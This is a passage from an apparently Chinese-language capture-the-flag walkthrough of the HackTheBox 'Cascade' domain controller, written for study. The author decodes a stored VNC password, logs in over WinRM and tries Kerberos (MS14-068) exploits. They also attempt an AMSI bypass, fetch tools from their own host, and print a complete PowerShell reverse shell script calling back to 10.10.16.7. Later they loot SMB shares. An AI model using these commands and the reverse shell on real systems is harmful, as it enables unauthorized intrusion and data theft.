class="hljs-string">&quot;AcceptRfbConnections&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;UseVncAuthentication&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;UseControlAuthentication&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;RepeatControlAuthentication&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;LoopbackOnly&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;AcceptHttpConnections&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;LogLevel&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;EnableFileTransfers&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;RemoveWallpaper&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;UseD3D&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;UseMirrorDriver&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;EnableUrlParams&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;Password&quot;</span>=hex:6b,cf,2a,4b,6e,5a,ca,0f<br><span class="hljs-string">&quot;AlwaysShared&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;NeverShared&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;DisconnectClients&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;PollingInterval&quot;</span>=dword:000003e8<br><span class="hljs-string">&quot;AllowLoopback&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;VideoRecognitionInterval&quot;</span>=dword:00000bb8<br><span class="hljs-string">&quot;GrabTransparentWindows&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;SaveLogToAllUsersPath&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;RunControlInterface&quot;</span>=dword:00000001<br><span class="hljs-string">&quot;IdleTimeout&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;VideoClasses&quot;</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-string">&quot;VideoRects&quot;</span>=<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>他看起来像是一个远程登录的配置，似乎他比较懒散，密码都被放在里边，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;Password&quot;</span>=hex:6b,cf,2a,4b,6e,5a,ca,0f<br></code></pre></td></tr></table></figure><p>即使我看不出来这是什么，但是没关系，我可以用<strong>vncpasswd.py</strong>的神奇工具解码这个十六进制字符串，该工具可在 GitHub 上轻松获得。这是下载工具链接的**<a href="https://github.com/trinitronx/vncpasswd.py">链接</a>**：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./vncpasswd.py -d -H 6bcf2a4b6e5aca0f  <br>Decrypted Bin Pass= <span class="hljs-string">&#x27;sT333ve2&#x27;</span><br>Decrypted Hex Pass= <span class="hljs-string">&#x27;7354333333766532&#x27;</span><br></code></pre></td></tr></table></figure><p>我获取到了s.smith的密码sT333ve2。那我可以再对其进行检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2   <br>SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)<br>HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman<br>WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)<br></code></pre></td></tr></table></figure><p>他可以用来被winrm登录，也可以查看smb共享。</p><h4 id="以s-smith身份登录目标："><a href="#以s-smith身份登录目标：" class="headerlink" title="以s.smith身份登录目标："></a>以s.smith身份登录目标：</h4><p>我登录到了目标：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.182</span> <span class="hljs-literal">-u</span> s.smith <span class="hljs-literal">-p</span> sT333ve2 <br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">3</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Documents&gt; <span class="hljs-built_in">ls</span> <span class="hljs-literal">-force</span><br><br><br>  Directory: C:\Users\s.smith\Documents<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br>d<span class="hljs-literal">--hsl</span>        <span class="hljs-number">1</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">36</span> AM                My Music<br>d<span class="hljs-literal">--hsl</span>        <span class="hljs-number">1</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">36</span> AM                My Pictures<br>d<span class="hljs-literal">--hsl</span>        <span class="hljs-number">1</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">36</span> AM                My Videos<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Documents&gt;<br></code></pre></td></tr></table></figure><p>并且他有flag:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Desktop&gt; <span class="hljs-built_in">dir</span><br><br><br>  Directory: C:\Users\s.smith\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-ar---</span>        <span class="hljs-number">4</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span>:<span class="hljs-number">23</span> PM             <span class="hljs-number">34</span> user.txt<br><span class="hljs-literal">-a----</span>         <span class="hljs-number">2</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">4</span>:<span class="hljs-number">24</span> PM           <span class="hljs-number">1031</span> WinDirStat.lnk<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Desktop&gt; <span class="hljs-built_in">type</span> user.txt<br></code></pre></td></tr></table></figure><h4 id="环境侦测："><a href="#环境侦测：" class="headerlink" title="环境侦测："></a>环境侦测：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Desktop&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br><span class="hljs-literal">----------------------</span><br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span> Enabled<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Desktop&gt; whoami /groups<br><br><span class="hljs-built_in">GROUP</span> INFORMATION<br><span class="hljs-literal">-----------------</span><br><br><span class="hljs-built_in">Group</span> Name                                  <span class="hljs-built_in">Type</span>             SID                                            Attributes<br>=========================================== ================ ============================================== ===============================================================<br>Everyone                                    Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-1-0</span>                                        Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Users                               Alias            S<span class="hljs-literal">-1-5-32-545</span>                                   Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Pre<span class="hljs-literal">-Windows</span> <span class="hljs-number">2000</span> Compatible Access  Alias            S<span class="hljs-literal">-1-5-32-554</span>                                   Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NETWORK                        Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-2</span>                                        Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\Authenticated Users            Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-11</span>                                       Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\This Organization              Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-15</span>                                       Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>CASCADE\Data Share                          Alias            S<span class="hljs-literal">-1-5-21-3332504370-1206983947-1165150453-1138</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>, Local <span class="hljs-built_in">Group</span><br>CASCADE\Audit Share                         Alias            S<span class="hljs-literal">-1-5-21-3332504370-1206983947-1165150453-1137</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>, Local <span class="hljs-built_in">Group</span><br>CASCADE\IT                                  Alias            S<span class="hljs-literal">-1-5-21-3332504370-1206983947-1165150453-1113</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>, Local <span class="hljs-built_in">Group</span><br>CASCADE\Remote Management Users             Alias            S<span class="hljs-literal">-1-5-21-3332504370-1206983947-1165150453-1126</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>, Local <span class="hljs-built_in">Group</span><br>NT AUTHORITY\NTLM Authentication            Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-64-10</span>                                    Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>Mandatory Label\Medium Plus Mandatory Level Label            S<span class="hljs-literal">-1-16-8448</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Desktop&gt; <br></code></pre></td></tr></table></figure><p>目标系统还是windows_server_2008 R2，我可以检测一下目标是否存在ms14-068，我可以使用Metasploit来帮我检测，检测ms14-068需要域，用户名，口令，目标IP，用户SID，SID可以通过RPC获取到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; lookupnames s.smith<br>s.smith S-1-5-21-3332504370-1206983947-1165150453-1107 (User: 1)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf-pro auxiliary(admin/kerberos/ms14_068_kerberos_checksum) &gt; show options <br><br>Module options (auxiliary/admin/kerberos/ms14_068_kerberos_checksum):<br><br> Name      Current Setting                 Required  Description<br> ----      ---------------                 --------  -----------<br> DOMAIN    cascade.local                   <span class="hljs-built_in">yes</span>       The Domain (upper <span class="hljs-keyword">case</span>) Ex: DEMO.LOCAL<br> PASSWORD  sT333ve2                        <span class="hljs-built_in">yes</span>       The Domain User password<br> RHOSTS    10.10.10.182                    <span class="hljs-built_in">yes</span>       The target host(s), see https://github.com/rapid7/met<br>                                                     asploit-framework/wiki/Using-Metasploit<br> RPORT     88                              <span class="hljs-built_in">yes</span>       The target port<br> Timeout   10                              <span class="hljs-built_in">yes</span>       The TCP <span class="hljs-built_in">timeout</span> to establish connection and <span class="hljs-built_in">read</span> data<br> USER      s.smith                         <span class="hljs-built_in">yes</span>       The Domain User<br> USER_SID  S-1-5-21-3332504370-1206983947  <span class="hljs-built_in">yes</span>       The Domain User SID, Ex: S-1-5-21-1755879683-36415771<br>           -1165150453-1107                          84-3486455962-1000<br><br>msf-pro auxiliary(admin/kerberos/ms14_068_kerberos_checksum) &gt; run<br>[*] Running module against 10.10.10.182<br><br>[*] Validating options...<br>[*] Using domain CASCADE.LOCAL...<br>[*] 10.10.10.182:88 - Sending AS-REQ...<br>[*] 10.10.10.182:88 - Parsing AS-REP...<br>[*] 10.10.10.182:88 - Sending TGS-REQ...<br>[+] 10.10.10.182:88 - Valid TGS-Response, extracting credentials...<br>[+] 10.10.10.182:88 - MIT Credential Cache saved on /opt/metasploit/apps/pro/loot/20220424221906_default_10.10.10.182_windows.kerberos_565346.bin<br>[*] Auxiliary module execution completed<br>msf-pro auxiliary(admin/kerberos/ms14_068_kerberos_checksum) &gt;<br></code></pre></td></tr></table></figure><p>看起来是存在的，但是利用失败了，或许目标打了补丁：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./goldenPac.py -dc-ip 10.10.10.182 -target-ip 10.10.10.182 cascade.local/s.smith@cascade.local<br>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>[*] User SID: S-1-5-21-3332504370-1206983947-1165150453-1107<br>[-] Couldn<span class="hljs-string">&#x27;t get forest info ([Errno Connection error (cascade.local:445)] [Errno -2] Name or service not known), continuing</span><br><span class="hljs-string">[*] Attacking domain controller 10.10.10.182</span><br><span class="hljs-string">[*] 10.10.10.182 seems not vulnerable (Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database))</span><br></code></pre></td></tr></table></figure><p>回到目标，我关不了反恶意软件扫描MSI：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith&gt; Bypass<span class="hljs-literal">-4MSI</span><br>Error: An error of <span class="hljs-built_in">type</span> WinRM::WinRMWSManFault happened, message is [<span class="hljs-type">WSMAN</span> <span class="hljs-type">ERROR</span> <span class="hljs-type">CODE</span>: <span class="hljs-number">1726</span>]: &lt;f:WSManFault Code=<span class="hljs-string">&#x27;1726&#x27;</span> Machine=<span class="hljs-string">&#x27;10.10.10.182&#x27;</span> xmlns:f=<span class="hljs-string">&#x27;http://schemas.microsoft.com/wbem/wsman/1/wsmanfault&#x27;</span>&gt;&lt;f:Message&gt;The WSMan provider host <span class="hljs-keyword">process</span> did not <span class="hljs-keyword">return</span> a proper response.  A provider <span class="hljs-keyword">in</span> the host <span class="hljs-keyword">process</span> may have behaved improperly. &lt;/f:Message&gt;&lt;/f:WSManFault&gt;                         <br><br>Error: Exiting with code <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>不过没事，他并不影响winPEAS为我枚举目标环境信息：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-symbol">*Evil</span>-WinRM* PS C:\Users\s.smith&gt; wget http:<span class="hljs-comment">//10.10.16.7/winPEASx86.exe -O winPEASx86.exe</span><br><span class="hljs-symbol">*Evil</span>-WinRM* PS C:\Users\s.smith&gt; .\winPEASx86.exe<br></code></pre></td></tr></table></figure><p>winPEAS并没有为我枚举到什么，甚至可提权的漏洞也没有，只是为我确定了哪些用户可以被登录，但是我没有密码。如果可以，我还是希望反弹一个shell给我，因为Evil-WinRM实在太慢了。我可以通过power shell试试，本地编写shell.ps1文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.16.7&quot;</span>,<span class="hljs-number">3333</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;PS &quot;</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">&quot;&gt; &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure><p>获取并加载：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Documents&gt; <br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Documents&gt; <span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">16.7</span>/shell.ps1 <span class="hljs-literal">-O</span> shell.ps1<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\s.smith\Documents&gt; .\shell.ps1<br></code></pre></td></tr></table></figure><p>反弹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvnp 3333                               <br>listening on [any] 3333 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.10.182] 49678<br><span class="hljs-built_in">whoami</span><br>cascade\s.smith<br>PS C:\Users\s.smith\Documents&gt; <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>但是并没有什么用。目标机器中没有什么文件。甚至我连共享目录都没找到。</p><h4 id="继续smb："><a href="#继续smb：" class="headerlink" title="继续smb："></a>继续smb：</h4><p>或许我应该再次探索smb，毕竟我获取到了一个新身份：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2    <br>[+] IP: 10.10.10.182:445        Name: 10.10.10.182                                      <br>      Disk                                                    Permissions     Comment<br>      ----                                                    -----------     -------<br>      ADMIN$                                                  NO ACCESS       Remote Admin<br>      Audit$                                                  READ ONLY<br>      C$                                                      NO ACCESS       Default share<br>      Data                                                    READ ONLY<br>      IPC$                                                    NO ACCESS       Remote IPC<br>      NETLOGON                                                READ ONLY       Logon server share <br>      <span class="hljs-built_in">print</span>$                                                  READ ONLY       Printer Drivers<br>      SYSVOL                                                  READ ONLY       Logon server share <br></code></pre></td></tr></table></figure><p>我可以访问新的目录Audit$ ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.182/Audit$ -U s.smith <br>Enter WORKGROUP\s.smith<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; dir</span><br><span class="hljs-string">.                                   D        0  Thu Jan 30 02:01:26 2020</span><br><span class="hljs-string">..                                  D        0  Thu Jan 30 02:01:26 2020</span><br><span class="hljs-string">CascAudit.exe                      An    13312  Wed Jan 29 05:46:51 2020</span><br><span class="hljs-string">CascCrypto.dll                     An    12288  Thu Jan 30 02:00:20 2020</span><br><span class="hljs-string">DB                                  D        0  Wed Jan 29 05:40:59 2020</span><br><span class="hljs-string">RunAudit.bat                        A       45  Wed Jan 29 07:29:47 2020</span><br><span class="hljs-string">System.Data.SQLite.dll              A   363520  Sun Oct 27 14:38:36 2019</span><br><span class="hljs-string">System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 14:38:38 2019</span><br><span class="hljs-string">x64                                 D        0  Mon Jan 27 06:25:27 2020</span><br><span class="hljs-string">x86                                 D        0  Mon Jan 27 06:25:27 2020</span><br><span class="hljs-string"></span><br><span class="hljs-string">              6553343 blocks of size 4096. 1611448 blocks available</span><br></code></pre></td></tr></table></figure><p>有很多很多东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \&gt; <span class="hljs-built_in">cd</span> x86<br>smb: \x86\&gt; <span class="hljs-built_in">dir</span><br>.                                   D        0  Mon Jan 27 06:25:27 2020<br>..                                  D        0  Mon Jan 27 06:25:27 2020<br>SQLite.Interop.dll                  A  1246720  Sun Oct 27 14:34:20 2019<br><br>              6553343 blocks of size 4096. 1611448 blocks available<br>smb: \x86\&gt; <span class="hljs-built_in">cd</span> ..<br>smb: \&gt; mget *<br>Get file CascAudit.exe? <span class="hljs-built_in">yes</span><br>getting file \CascAudit.exe of size 13312 as CascAudit.exe (10.6 KiloBytes/sec) (average 10.6 KiloBytes/sec)<br>Get file CascCrypto.dll? <span class="hljs-built_in">yes</span><br>getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (10.7 KiloBytes/sec) (average 10.6 KiloBytes/sec)<br>Get file RunAudit.bat? <span class="hljs-built_in">yes</span><br>getting file \RunAudit.bat of size 45 as RunAudit.bat (0.0 KiloBytes/sec) (average 7.2 KiloBytes/sec)<br>Get file System.Data.SQLite.dll? <span class="hljs-built_in">yes</span><br>getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (109.1 KiloBytes/sec) (average 56.6 KiloBytes/sec)<br>Get file System.Data.SQLite.EF6.dll? <span class="hljs-built_in">yes</span><br>getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (97.4 KiloBytes/sec) (average 65.5 KiloBytes/sec)<br>smb: \&gt; <span class="hljs-built_in">dir</span><br>.                                   D        0  Thu Jan 30 02:01:26 2020<br>..                                  D        0  Thu Jan 30 02:01:26 2020<br>CascAudit.exe                      An    13312  Wed Jan 29 05:46:51 2020<br>CascCrypto.dll                     An    12288  Thu Jan 30 02:00:20 2020<br>DB                                  D        0  Wed Jan 29 05:40:59 2020<br>RunAudit.bat                        A       45  Wed Jan 29 07:29:47 2020<br>System.Data.SQLite.dll              A   363520  Sun Oct 27 14:38:36 2019<br>System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 14:38:38 2019<br>x64                                 D        0  Mon Jan 27 06:25:27 2020<br>x86                                 D        0  Mon Jan 27 06:25:27 2020<br><br>              6553343 blocks of size 4096. 1611448 blocks available<br>smb: \x64\&gt; <br>smb: \x64\&gt; <span class="hljs-built_in">ls</span><br>.                                   D        0  Mon Jan 27 06:25:27 2020<br>..                                  D        0  Mon Jan 27 06:25:27 2020<br>SQLite.Interop.dll                  A  1639936  Sun Oct 27 14:39:20 2019<br><br>              6553343 blocks of size 4096. 1611447 blocks available<br>smb: \x64\&gt; get SQLite.Interop.dll <br>getting file \x64\SQLite.Interop.dll of size 1639936 as SQLite.Interop.dll (496.4 KiloBytes/sec) (average 171.5 KiloBytes/sec)<br>smb: \x64\&gt; <br></code></pre></td></tr></table></figure><p>我觉得自己就像一个土匪，能拿的都拿，在DB目录中还会有一个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \DB\&gt; <span class="hljs-built_in">ls</span><br>.                                   D        0  Wed Jan 29 05:40:59 2020<br>..                                  D        0  Wed Jan 29 05:40:59 2020<br>Audit.db                           An    24576  Wed Jan 29 05:39:24 2020<br><br>              6553343 blocks of size 4096. 1611447 blocks available<br>smb: \DB\&gt; get Audit.db <br>getting file \DB\Audit.db of size 24576 as Audit.db 